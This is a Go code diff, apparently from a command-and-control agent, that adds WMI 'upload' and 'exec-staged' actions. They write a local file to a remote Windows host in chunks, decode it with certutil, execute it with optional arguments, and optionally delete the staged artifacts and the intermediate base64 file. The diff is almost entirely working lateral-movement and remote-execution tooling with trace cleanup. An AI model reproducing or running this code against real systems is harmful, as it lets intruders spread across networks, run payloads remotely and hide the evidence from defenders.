@@ -26,11 +26,15 @@ func (c *WmiCommand) Description() string {
 }
 
 type wmiArgs struct {
-	Action  string `json:"action"`
-	Target  string `json:"target"`
-	Command string `json:"command"`
-	Query   string `json:"query"`
-	Timeout int    `json:"timeout"`
+	Action     string `json:"action"`
+	Target     string `json:"target"`
+	Command    string `json:"command"`
+	Query      string `json:"query"`
+	Timeout    int    `json:"timeout"`
+	LocalPath  string `json:"local_path"`
+	RemotePath string `json:"remote_path"`
+	Method     string `json:"method"`
+	Cleanup    bool   `json:"cleanup"`
 }
 
 func (c *WmiCommand) Execute(task structs.Task) structs.CommandResult {
@@ -54,8 +58,12 @@ func (c *WmiCommand) Execute(task structs.Task) structs.CommandResult {
 		fn = func() structs.CommandResult { return wmiProcessList(args.Target) }
 	case "os-info":
 		fn = func() structs.CommandResult { return wmiOsInfo(args.Target) }
+	case "upload":
+		fn = func() structs.CommandResult { return wmiUpload(args) }
+	case "exec-staged":
+		fn = func() structs.CommandResult { return wmiExecStaged(args) }
 	default:
-		return errorf("Unknown action: %s\nAvailable: execute, query, process-list, os-info", args.Action)
+		return errorf("Unknown action: %s\nAvailable: execute, query, process-list, os-info, upload, exec-staged", args.Action)
 	}
 
 	// Run with timeout protection to prevent agent hangs on unreachable targets
@@ -323,4 +331,129 @@ func wmiOsInfo(target string) structs.CommandResult {
 	}
 
 	return successf("WMI OS Info:\n%s", result)
+}
+
+// wmiUpload stages a local file on the remote host via WMI command execution.
+func wmiUpload(args wmiArgs) structs.CommandResult {
+	if args.LocalPath == "" {
+		return errorResult("Error: local_path is required (file to upload from agent filesystem)")
+	}
+	if args.Target == "" {
+		return errorResult("Error: target is required (remote host)")
+	}
+
+	method := parseStagingMethod(args.Method)
+	plan, err := planStaging(args.LocalPath, args.RemotePath, method)
+	if err != nil {
+		return errorf("Error planning staging: %v", err)
+	}
+
+	host := args.Target
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("Staging file to %s via WMI:\n", host))
+	sb.WriteString(fmt.Sprintf("  Source:      %s\n", args.LocalPath))
+	sb.WriteString(fmt.Sprintf("  Destination: %s\n", plan.RemotePath))
+	sb.WriteString(fmt.Sprintf("  Method:      %s\n", args.Method))
+	sb.WriteString(fmt.Sprintf("  Commands:    %d write + %d decode\n\n", len(plan.WriteCommands), boolToInt(plan.DecodeCommand != "")))
+
+	// Execute write commands
+	for i, cmd := range plan.WriteCommands {
+		result := wmiExecute(host, cmd)
+		if !(result.Status == "success") {
+			return errorf("Error on write chunk %d/%d: %s", i+1, len(plan.WriteCommands), result.Output)
+		}
+		sb.WriteString(fmt.Sprintf("  [%d/%d] Write chunk OK\n", i+1, len(plan.WriteCommands)))
+	}
+
+	// Execute decode command (certutil method)
+	if plan.DecodeCommand != "" {
+		result := wmiExecute(host, plan.DecodeCommand)
+		if !(result.Status == "success") {
+			return errorf("Error decoding staged file: %s", result.Output)
+		}
+		sb.WriteString("  Decode OK\n")
+	}
+
+	sb.WriteString(fmt.Sprintf("\nFile staged at: %s\n", plan.RemotePath))
+	sb.WriteString("Use exec-staged to execute, or cleanup manually.")
+
+	return successResult(sb.String())
+}
+
+// wmiExecStaged uploads a file to the remote host, executes it, and optionally cleans up.
+func wmiExecStaged(args wmiArgs) structs.CommandResult {
+	if args.LocalPath == "" {
+		return errorResult("Error: local_path is required (file to stage and execute)")
+	}
+	if args.Target == "" {
+		return errorResult("Error: target is required (remote host)")
+	}
+
+	method := parseStagingMethod(args.Method)
+	plan, err := planStaging(args.LocalPath, args.RemotePath, method)
+	if err != nil {
+		return errorf("Error planning staging: %v", err)
+	}
+
+	host := args.Target
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("Staged execution on %s via WMI:\n", host))
+	sb.WriteString(fmt.Sprintf("  Source:  %s\n", args.LocalPath))
+	sb.WriteString(fmt.Sprintf("  Remote:  %s\n", plan.RemotePath))
+	sb.WriteString(fmt.Sprintf("  Method:  %s\n\n", args.Method))
+
+	// Phase 1: Stage the file
+	sb.WriteString("--- Phase 1: Staging ---\n")
+	for i, cmd := range plan.WriteCommands {
+		result := wmiExecute(host, cmd)
+		if !(result.Status == "success") {
+			return errorf("Staging failed on chunk %d/%d: %s", i+1, len(plan.WriteCommands), result.Output)
+		}
+		sb.WriteString(fmt.Sprintf("  [%d/%d] Write OK\n", i+1, len(plan.WriteCommands)))
+	}
+
+	if plan.DecodeCommand != "" {
+		result := wmiExecute(host, plan.DecodeCommand)
+		if !(result.Status == "success") {
+			// Clean up partial staging
+			for _, cmd := range plan.CleanupCommands {
+				wmiExecute(host, cmd)
+			}
+			return errorf("Decode failed: %s", result.Output)
+		}
+		sb.WriteString("  Decode OK\n")
+		// Delete the intermediate base64 file
+		b64Cleanup := fmt.Sprintf(`cmd.exe /c del /f /q "%s.b64"`, plan.RemotePath)
+		wmiExecute(host, b64Cleanup)
+	}
+
+	// Phase 2: Execute
+	sb.WriteString("\n--- Phase 2: Execution ---\n")
+	execCmd := plan.RemotePath
+	if args.Command != "" {
+		// Allow appending arguments to the staged binary
+		execCmd = fmt.Sprintf(`%s %s`, plan.RemotePath, args.Command)
+	}
+	execResult := wmiExecute(host, execCmd)
+	sb.WriteString(fmt.Sprintf("  Execute: %s\n", execResult.Output))
+
+	// Phase 3: Cleanup
+	if args.Cleanup {
+		sb.WriteString("\n--- Phase 3: Cleanup ---\n")
+		for _, cmd := range plan.CleanupCommands {
+			wmiExecute(host, cmd)
+		}
+		sb.WriteString("  Artifacts removed\n")
+	} else {
+		sb.WriteString(fmt.Sprintf("\n  Note: File remains at %s (use cleanup=true to auto-remove)\n", plan.RemotePath))
+	}
+
+	return successResult(sb.String())
+}
+
+func boolToInt(b bool) int {
+	if b {
+		return 1
+	}
+	return 0
 }
